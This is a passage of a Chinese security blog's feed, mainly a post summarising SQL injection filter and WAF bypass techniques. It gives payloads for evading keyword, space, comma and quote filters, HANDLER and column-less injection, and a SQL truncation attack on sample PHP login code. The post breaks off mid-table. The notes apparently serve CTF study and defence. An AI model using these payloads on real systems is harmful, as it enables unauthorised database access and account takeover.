class="hljs-meta">%E4</span><span class="hljs-meta">%BB</span><span class="hljs-meta">%A4</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%B7</span><span class="hljs-meta">%B7</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%B7</span><span class="hljs-meta">%86</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%8A</span><span class="hljs-meta">%80</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%9C</span><span class="hljs-meta">%AF20181212</span>.html<br>https://blog.csdn.net/whuslei/article/details/<span class="hljs-number">7187639</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WAF绕过</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入绕过</title>
    <link href="/2022/06/16/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/"/>
    <url>/2022/06/16/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>今天总结一下sql注入过程中目前阶段碰到的主要过滤问题。</p><h4 id="0x00-基本问题"><a href="#0x00-基本问题" class="headerlink" title="0x00 基本问题"></a>0x00 基本问题</h4><p>sql注入过程中，为了防止注入，代码中一般会进行输入字符的过滤或拦截。其中过滤指的是输入的内容被删除or替换成了别的字符，拦截指的是检测到指定内容存在后，直接返回错误，不再进行后续的操作。</p><h4 id="0x01-and-or"><a href="#0x01-and-or" class="headerlink" title="0x01 and&#x2F;or"></a>0x01 and&#x2F;or</h4><p>1.尝试双写or大小写绕过</p><p>2.运算符代替:<code>&amp;&amp;</code>,<code>||</code></p><p>3.<code>^</code>运算符，例如:?id&#x3D;1^(1&#x3D;0) (1^0&#x3D;1,故返回id&#x3D;1的数据)</p><p>4.拼接<code>=</code>运算符，例如:?id&#x3D;1&#x3D;(1&#x3D;1) (1&#x3D;1为真，故返回id&#x3D;true即id&#x3D;1的数据(true&#x3D;1))</p><h4 id="0x02-空格"><a href="#0x02-空格" class="headerlink" title="0x02 空格"></a>0x02 空格</h4><p>1.注释&#x2F;**&#x2F;代替</p><p>2.<code>and/or</code>后面可以加偶数个<code>!或~</code>可以替代空格，也可以混合使用</p><p>3.<code>%09, %0a, %0b, %0c, %0d, %a0</code>等部分不可见字符绕过</p><p>4.巧用括号</p><h4 id="0x03-括号"><a href="#0x03-括号" class="headerlink" title="0x03 括号"></a>0x03 括号</h4><p>使用order by进行盲注，例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,&#123;<span class="hljs-string">&#x27;1&#x27;</span>&#125; <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> limit <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>通过修改大括号中的值，即可进行指定字符串与目标未知字符串的比较，如果大于则位置字符串排在前，如果小于则指定字符串排在前。通过limit来控制显示问题。由此可通过编写脚本进行注入。</p><h4 id="0x04-逗号"><a href="#0x04-逗号" class="headerlink" title="0x04 逗号"></a>0x04 逗号</h4><p>1.盲注</p><p>2.使用join语句。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p>对于某些字符串处理函数，例如substr，可以通过substr(str from pos for len)的方法以避免使用括号，limit 0,1 可以通过limit 1 offset 1代替。</p><h4 id="0x05-引号"><a href="#0x05-引号" class="headerlink" title="0x05 引号"></a>0x05 引号</h4><p>1.考虑宽字节注入(存在编码问题时)</p><p>2.引号逃逸(当存在两个或以上数据输入时，通过\可以转义一个单引号，随后在下一个输入框or字段中写入注入代码，最后添加注释符，这时可巧妙的避开引号闭合问题)</p><h4 id="0x06-注释"><a href="#0x06-注释" class="headerlink" title="0x06 注释"></a>0x06 注释</h4><p>1.巧妙闭合单引号，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;$id&#x27;</span>;<br>注入代码：?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; union select 1,2,&#x27;</span>3<br></code></pre></td></tr></table></figure><h4 id="0x07-数字"><a href="#0x07-数字" class="headerlink" title="0x07 数字"></a>0x07 数字</h4><table><thead><tr><th>代替字符</th><th>数</th><th>代替字符</th><th>数</th><th>代替字符</th><th>数</th><th></th><th></th></tr></thead><tbody><tr><td>false、!pi()</td><td>0</td><td>ceil(pi()*pi())</td><td>10</td><td>A</td><td>ceil((pi()+pi())*pi())</td><td>20</td><td>K</td></tr><tr><td>true、!(!pi())</td><td>1</td><td>ceil(pi()*pi())+true</td><td>11</td><td>B</td><td>ceil(ceil(pi())*version())</td><td>21</td><td>L</td></tr><tr><td>true+true</td><td>2</td><td>ceil(pi()+pi()+version())</td><td>12</td><td>C</td><td>ceil(pi()*ceil(pi()+pi()))</td><td>22</td><td>M</td></tr><tr><td>floor(pi());~~pi()</td><td>3</td><td>floor(pi()*pi()+pi())</td><td>13</td><td>D</td><td>ceil((pi()+ceil(pi()))*pi())</td><td>23</td><td>N</td></tr><tr><td>ceil(pi())</td><td>4</td><td>ceil(pi()*pi()+pi())</td><td>14</td><td>E</td><td>ceil(pi())*ceil(version())</td><td>24</td><td>O</td></tr><tr><td>floor(version()) &#x2F;&#x2F;注意版本</td><td>5</td><td>ceil(pi()*pi()+version())</td><td>15</td><td>F</td><td>floor(pi()*(version()+pi()))</td><td>25</td><td>P</td></tr><tr><td>ceil(version())</td><td>6</td><td>floor(pi()*version())</td><td>16</td><td>G</td><td>floor(version()*version())</td><td>26</td><td>Q</td></tr><tr><td>ceil(pi()+pi())</td><td>7</td><td>ceil(pi()*version())</td><td>17</td><td>H</td><td>ceil(version()*version())</td><td>27</td><td>R</td></tr><tr><td>floor(version()+pi())</td><td>8</td><td>ceil(pi()*version())+true</td><td>18</td><td>I</td><td>ceil(pi()*pi()*pi()-pi())</td><td>28</td><td>S</td></tr><tr><td>floor(pi()*pi())</td><td>9</td><td>floor((pi()+pi())*pi())</td><td>19</td><td>J</td><td>floor(pi()*pi()*floor(pi()))</td><td>29</td><td>T</td></tr></tbody></table><h4 id="0x08-等于号，大于号，小于号"><a href="#0x08-等于号，大于号，小于号" class="headerlink" title="0x08 等于号，大于号，小于号"></a>0x08 等于号，大于号，小于号</h4><p>等于号可以通过like绕过，大于号小于号主要使用greatest函数，strcmp函数，between and操作符代替。</p><h4 id="0x09-常见函数-符号总结"><a href="#0x09-常见函数-符号总结" class="headerlink" title="0x09 常见函数&#x2F;符号总结"></a>0x09 常见函数&#x2F;符号总结</h4><h5 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h5><table><thead><tr><th>单行注释</th><th>单行注释</th><th>单行注释</th><th>多行(内联)注释</th></tr></thead><tbody><tr><td><code>#</code></td><td><code>-- x //x为任意字符</code></td><td><code>;%00</code></td><td><code>/*任意内容*/</code></td></tr></tbody></table><h5 id="常用运算符"><a href="#常用运算符" class="headerlink" title="常用运算符"></a>常用运算符</h5><table><thead><tr><th>运算符</th><th>说明</th><th>运算符</th><th>说明</th><th></th><th></th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>与，同and。</td><td>\</td><td>\</td><td></td><td>或，同or。</td></tr><tr><td>!</td><td>非，同not。</td><td>~</td><td>一元比特反转。</td><td></td><td></td></tr><tr><td>^</td><td>异或，同xor。</td><td>+</td><td>加，可替代空格，如<code>select+user()</code>。</td><td></td><td></td></tr></tbody></table><h5 id="系统信息函数"><a href="#系统信息函数" class="headerlink" title="系统信息函数"></a>系统信息函数</h5><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>USER()</td><td>获取当前操作句柄的用户名，同SESSION_USER()、CURRENT_USER()，有时也用SYSTEM_USER()。</td></tr><tr><td>DATABASE()</td><td>获取当前选择的数据库名，同SCHEMA()。</td></tr><tr><td>VERSION()</td><td>获取当前版本信息。</td></tr></tbody></table><h5 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h5><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>ORD(str)</td><td>返回字符串第一个字符的ASCII值。</td></tr><tr><td>OCT(N)</td><td>以字符串形式返回 <code>N</code> 的八进制数，<code>N</code> 是一个BIGINT 型数值，作用相当于<code>CONV(N,10,8)</code>。</td></tr><tr><td>HEX(N_S)</td><td>参数为字符串时，返回 <code>N_or_S</code> 的16进制字符串形式，为数字时，返回其16进制数形式。</td></tr><tr><td>UNHEX(str)</td><td><code>HEX(str)</code> 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符。</td></tr><tr><td>BIN(N)</td><td>返回十进制数值 <code>N</code> 的二进制数值的字符串表现形式。</td></tr><tr><td>ASCII(str)</td><td>同<code>ORD(string)</code>。</td></tr><tr><td>CONV(N,from_base,to_base)</td><td>将数值型参数 <code>N</code> 由初始进制 <code>from_base</code> 转换为目标进制 <code>to_base</code> 的形式并返回。</td></tr><tr><td>CHAR(N,… [USING charset_name])</td><td>将每一个参数 <code>N</code> 都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串。</td></tr></tbody></table><h5 id="字符截取-拼接"><a href="#字符截取-拼接" class="headerlink" title="字符截取&#x2F;拼接"></a>字符截取&#x2F;拼接</h5><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>SUBSTR(str,N_start,N_length)</td><td>对指定字符串进行截取，为SUBSTRING的简单版。</td></tr><tr><td>SUBSTRING()</td><td>多种格式<code>SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)</code>。</td></tr><tr><td>RIGHT(str,len)</td><td>对指定字符串从<strong>最右边</strong>截取指定长度。</td></tr><tr><td>LEFT(str,len)</td><td>对指定字符串从<strong>最左边</strong>截取指定长度。</td></tr><tr><td><strong>RPAD(str,len,padstr)</strong></td><td>在 <code>str</code> 右方补齐 <code>len</code> 位的字符串 <code>padstr</code>，返回新字符串。如果 <code>str</code> 长度大于 <code>len</code>，则返回值的长度将缩减到 <code>len</code> 所指定的长度。</td></tr><tr><td><strong>LPAD(str,len,padstr)</strong></td><td>与RPAD相似，在<code>str</code>左边补齐。</td></tr><tr><td>MID(str,pos,len)</td><td>同于 <code>SUBSTRING(str,pos,len)</code>。</td></tr><tr><td><strong>INSERT(str,pos,len,newstr)</strong></td><td>在原始字符串 <code>str</code> 中，将自左数第 <code>pos</code> 位开始，长度为 <code>len</code> 个字符的字符串替换为新字符串 <code>newstr</code>，然后返回经过替换后的字符串。<code>INSERT(str,len,1,0x0)</code>可当做截取函数。</td></tr><tr><td>CONCAT(str1,str2…)</td><td>函数用于将多个字符串合并为一个字符串</td></tr><tr><td>GROUP_CONCAT(…)</td><td>返回一个字符串结果，该结果由分组中的值连接组合而成。</td></tr><tr><td><strong>MAKE_SET(bits,str1,str2,…)</strong></td><td>根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：<code>EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,&#39;1&#39;,&#39;710&#39;))</code>。</td></tr></tbody></table><h5 id="常见全局变量"><a href="#常见全局变量" class="headerlink" title="常见全局变量"></a>常见全局变量</h5><table><thead><tr><th>变量</th><th>说明</th><th>变量</th><th>说明</th></tr></thead><tbody><tr><td>@@VERSION</td><td>返回版本信息</td><td>@@HOSTNAME</td><td>返回安装的计算机名称</td></tr><tr><td>@@GLOBAL.VERSION</td><td>同<code>@@VERSION</code></td><td>@@BASEDIR</td><td>返回MYSQL绝对路径</td></tr></tbody></table><p>PS：查看全部全局变量<code>SHOW GLOBAL VARIABLES;</code>。</p><h5 id="其他常用函数-语句"><a href="#其他常用函数-语句" class="headerlink" title="其他常用函数&#x2F;语句"></a>其他常用函数&#x2F;语句</h5><table><thead><tr><th>函数&#x2F;语句</th><th>说明</th></tr></thead><tbody><tr><td>LENGTH(str)</td><td>返回字符串的长度。</td></tr><tr><td>PI()</td><td>返回π的具体数值。</td></tr><tr><td>REGEXP “statement”</td><td>正则匹配数据，返回值为布尔值。</td></tr><tr><td>LIKE “statement”</td><td>匹配数据，%代表任意内容。返回值为布尔值。</td></tr><tr><td>RLIKE “statement”</td><td>与regexp相同。</td></tr><tr><td>LOCATE(substr,str,[pos])</td><td>返回子字符串第一次出现的位置。</td></tr><tr><td>POSITION(substr IN str)</td><td>等同于 <code>LOCATE()</code>。</td></tr><tr><td>LOWER(str)</td><td>将字符串的大写字母全部转成小写。同：<code>LCASE(str)</code>。</td></tr><tr><td>UPPER(str)</td><td>将字符串的小写字母全部转成大写。同：<code>UCASE(str)</code>。</td></tr><tr><td>ELT(N,str1,str2,str3,…)</td><td>与<code>MAKE_SET(bit,str1,str2...)</code>类似，根据<code>N</code>返回参数值。</td></tr><tr><td>NULLIF(expr1,expr2)</td><td>若expr1与expr2相同，则返回expr1，否则返回NULL。</td></tr><tr><td>CHARSET(str)</td><td>返回字符串使用的字符集。</td></tr><tr><td>DECODE(<em>crypt_str</em>,<em>pass_str</em>)</td><td>使用 pass_str 作为密码，解密加密字符串 crypt_str。加密函数：<code>ENCODE(str,pass_str)</code>。</td></tr></tbody></table><h4 id="0x0a-handler语句代替select-mysql"><a href="#0x0a-handler语句代替select-mysql" class="headerlink" title="0x0a handler语句代替select[mysql]"></a>0x0a handler语句代替select[mysql]</h4><blockquote><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。[故其他数据库不可用]</p></blockquote><p>语法结构：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><br>HANDLER tbl_name <span class="hljs-keyword">OPEN</span> <span class="hljs-comment">[ <span class="hljs-comment">[AS]</span> alias]</span><br><br>HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)<br>    <span class="hljs-comment">[ WHERE where_condition ]</span> <span class="hljs-comment">[LIMIT ... ]</span><br>HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;<br>    <span class="hljs-comment">[ WHERE where_condition ]</span> <span class="hljs-comment">[LIMIT ... ]</span><br>HANDLER tbl_name READ &#123; FIRST | NEXT &#125;<br>    <span class="hljs-comment">[ WHERE where_condition ]</span> <span class="hljs-comment">[LIMIT ... ]</span><br><br>HANDLER tbl_name CLOSE<br></code></pre></td></tr></table></figure><p>如：通过handler语句查询users表的内容</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><br>handler users <span class="hljs-built_in">open</span> <span class="hljs-keyword">as</span> yunensec; <span class="hljs-comment">#指定数据表进行载入并将返回句柄重命名</span><br>handler yunensec <span class="hljs-built_in">read</span> <span class="hljs-keyword">first</span>; <span class="hljs-comment">#读取指定表/句柄的首行数据</span><br>handler yunensec <span class="hljs-built_in">read</span> next; <span class="hljs-comment">#读取指定表/句柄的下一行数据</span><br>handler yunensec <span class="hljs-built_in">read</span> next; <span class="hljs-comment">#读取指定表/句柄的下一行数据</span><br>...<br>handler yunensec <span class="hljs-built_in">close</span>; <span class="hljs-comment">#关闭句柄</span><br></code></pre></td></tr></table></figure><h4 id="0x0b-无列名注入"><a href="#0x0b-无列名注入" class="headerlink" title="0x0b 无列名注入"></a>0x0b 无列名注入</h4><p>在不知道列名的情况下，除了使用order by盲注外，还可以直接使用select进行盲注，即select无列名注入。例如：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><br><span class="hljs-keyword">select</span> <span class="hljs-symbol">`1`</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users) <span class="hljs-keyword">as</span> a;<br></code></pre></td></tr></table></figure><p>具体可以参考<a href="https://github.com/su29029/su29029.github.io/blob/master/_posts/2020-6-23-V1lu0%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0hard_sql.md">V1lu0实验室招新hard_sql</a>或<a href="https://x5tar.com/2019/10/24/cnss-recruit-2019-web/#hard-sql">CNSS 2019招新hard_sql</a>。</p><h4 id="0x0c-其他"><a href="#0x0c-其他" class="headerlink" title="0x0c 其他"></a>0x0c 其他</h4><h5 id="UPDATE注入重复字段赋值"><a href="#UPDATE注入重复字段赋值" class="headerlink" title="UPDATE注入重复字段赋值"></a>UPDATE注入重复字段赋值</h5><p>即：<code>UPDATA table_name set field1=new_value,field1=new_value2 [where子句]</code>，最终field1字段的内容为new_value2，可用这个特性来进行UPDATA注入。如：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">UPDATE</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">set</span> field1=new_value,field1=(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()) [<span class="hljs-keyword">where</span>子句]<br></code></pre></td></tr></table></figure><h5 id="sql约束攻击"><a href="#sql约束攻击" class="headerlink" title="sql约束攻击"></a>sql约束攻击</h5><p>举个例子，假设我们创建了一个数据表：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users(<br>    username <span class="hljs-type">varchar</span>(<span class="hljs-number">25</span>),<br>    <span class="hljs-keyword">password</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">25</span>)<br>)<br></code></pre></td></tr></table></figure><p>这时候我们进行登录注册的相关代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">// 注册</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;127.0.0.1:3306&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;db&quot;</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . <span class="hljs-title function_ invoke__">mysqli_connect_error</span>());<br>&#125;<br><span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">addslashes</span>(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br><span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">addslashes</span>(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$sql1</span> = <span class="hljs-string">&quot;select * from users where username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$rs</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql1</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$rs</span>-&gt;<span class="hljs-title function_ invoke__">fetch_row</span>())&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;账号已注册&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$sql2</span> = <span class="hljs-string">&quot;insert into users values(&#x27;<span class="hljs-subst">$username</span>&#x27;,&#x27;<span class="hljs-subst">$password</span>&#x27;)&quot;</span>;<br>    <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql2</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;注册成功&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">// 登录</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;127.0.0.1:3306&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;db&quot;</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . <span class="hljs-title function_ invoke__">mysqli_connect_error</span>());<br>&#125;<br><span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">addslashes</span>(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br><span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">addslashes</span>(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where username = &#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;;&quot;</span>;<br><span class="hljs-variable">$rs</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$rs</span>-&gt;<span class="hljs-title function_ invoke__">fetch_row</span>())&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]=<span class="hljs-variable">$password</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里没有编码问题，也进行了转移操作，由于存在长度限制，故可尝试sql约束攻击。注册名为<code>admin                         1</code>的用户名，密码自定，随后使用admin登录，密码就是刚刚的密码，发现登录成功。(原理，注册时select的时候，超长度的字段不会截取，故检查出未注册，而insert的时候会截取前25个字符，故再进行登录的时候’admin’&#x3D;’admin                     ‘，从而登录成功)</p><h4 id="0x0c-常见过滤绕过方法"><a href="#0x0c-常见过滤绕过方法" class="headerlink" title="0x0c 常见过滤绕过方法"></a>0x0c 常见过滤绕过方法</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs sql">过滤关键字    <span class="hljs-keyword">and</span> <span class="hljs-keyword">or</span><br>php代码    preg_match(<span class="hljs-string">&#x27;/(and|or)/i&#x27;</span>,$id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">||</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br><br>过滤关键字    <span class="hljs-keyword">and</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">union</span><br>php代码    preg_match(<span class="hljs-string">&#x27;/(and|or|union)/i&#x27;</span>,$id)<br>会过滤的攻击代码    <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,password <span class="hljs-keyword">from</span> users<br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> userid<span class="hljs-operator">=</span><span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span><br><br>过滤关键字    <span class="hljs-keyword">and</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">where</span><br>php代码    preg_match(<span class="hljs-string">&#x27;/(and|or|union|where)/i&#x27;</span>,$id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br><br>过滤关键字    <span class="hljs-keyword">and</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">where</span><br>php代码    preg_match(<span class="hljs-string">&#x27;/(and|or|union|where)/i&#x27;</span>,$id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br><br>过滤关键字    <span class="hljs-keyword">and</span>, <span 